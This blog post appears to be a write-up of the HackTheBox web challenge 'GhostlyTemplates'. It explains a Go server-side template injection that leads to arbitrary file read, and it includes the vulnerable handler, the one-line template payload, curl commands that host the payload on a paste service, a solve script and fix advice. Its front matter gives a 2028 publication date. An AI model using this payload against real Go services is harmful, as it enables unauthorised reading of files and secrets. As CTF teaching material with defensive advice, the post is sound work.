---
layout: post
title: "GhostlyTemplates"
date: 2028-05-16 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssti, golang, template-injection, arbitrary-file-read, cwe-1336, cwe-73]
description: "A Go site that renders your own remote template — against a struct that quietly exposes a file-reading method. One line of template markup reads the flag off disk."
---

## Overview

GhostlyTemplates is an **Easy** HackTheBox **Web** challenge. A small Go web app renders
Halloween-themed templates, and one endpoint will happily fetch a template from a URL *you*
supply and execute it. Because the data object handed to the template exposes a method that
wraps `os.ReadFile`, a single line of template markup turns into [arbitrary file read](https://cwe.mitre.org/data/definitions/73.html) —
straight to the flag at `/flag.txt`.

## The technique

The vulnerability is [Server-Side Template Injection](https://cwe.mitre.org/data/definitions/1336.html)
([CWE-1336](https://cwe.mitre.org/data/definitions/1336.html)) with a Go-specific twist. The
`/view` handler:

```go
var page   string = r.URL.Query().Get("page")
var remote string = r.URL.Query().Get("remote")
...
if remote == "true" {
    tmplFile, err = readRemoteFile(page)     // fetches attacker's URL as the template SOURCE
} else {
    tmplFile = reqData.OutFileContents(TEMPLATE_DIR + "/" + page)
}
tmpl, err := template.New("page").Parse(tmplFile)   // parses attacker text as a template
tmpl.Execute(w, reqData)                            // executes it against reqData
```

Two facts combine:

1. **`remote=true` lets us control the template body.** `readRemoteFile(page)` does an
   `http.Get(page)` and returns whatever comes back — so the "template" is fetched from a URL we
   host.
2. **The data object exposes a dangerous method.** Go's `text/template` / `html/template` can
   call any *exported method* on the data value as `{{.Method arg}}`. `reqData` is a
   `*RequestData`, and that type defines:

```go
func (p RequestData) OutFileContents(filePath string) string {
    data, err := os.ReadFile(filePath)
    if err != nil { return err.Error() }
    return string(data)
}
```

A value-receiver method wrapping `os.ReadFile`, callable from any template with any path.
`html/template`'s auto-escaping protects *output* (against XSS) — it does nothing to stop a
template from *calling a method*.

## Solution

The template we host:

```
{{.OutFileContents "/flag.txt"}}
```

It has to be served from a URL the challenge **container** can reach — a local
`python3 -m http.server` won't do, because the public HTB container can't route back to your box.
A plain paste service is the simplest reliable host:

```bash
URL=$(printf '%s' '{{.OutFileContents "/flag.txt"}}' | curl -s -F 'content=<-' https://dpaste.com/api/v2/).txt
curl -s "http://TARGET:PORT/view?page=${URL}&remote=true"
# -> HTB{...}
```

The durable artifact, `solve.py`:

```python
import sys, requests

TARGET  = sys.argv[1]                      # http://host:port
TPL_URL = sys.argv[2]                      # dpaste raw of {{.OutFileContents "/flag.txt"}}

r = requests.get(f"{TARGET}/view", params={"page": TPL_URL, "remote": "true"})
print(r.text.strip())
```

The server fetches our template, executes it against `reqData`, calls `OutFileContents("/flag.txt")`,
and renders the file contents right back in the HTTP response.

## Why it worked

The developer treated `RequestData` as harmless "template data," forgetting that in Go every
exported method on that struct is a callable gadget inside the template. Here the gadget reads
files. In the closely related challenge *RenderQuest*, the same remote-template primitive met a
struct exposing `FetchServerInfo(cmd)` wrapping `exec.Command` — the identical bug, but that time
it was full remote code execution instead of file read.

## Fix / defense

- **Never `Parse()` an externally-controlled template.** Render only fixed, server-side templates
  and pass user data as `.Field` values — never as template text.
- **Drop remote template fetching** (`remote=true`); if it's truly required, render in a sandboxed
  subprocess with no access to the application's data types.
- **Don't expose file/exec/network methods on the template data struct.** Use a purpose-built view
  model carrying only pre-computed, safe string fields.
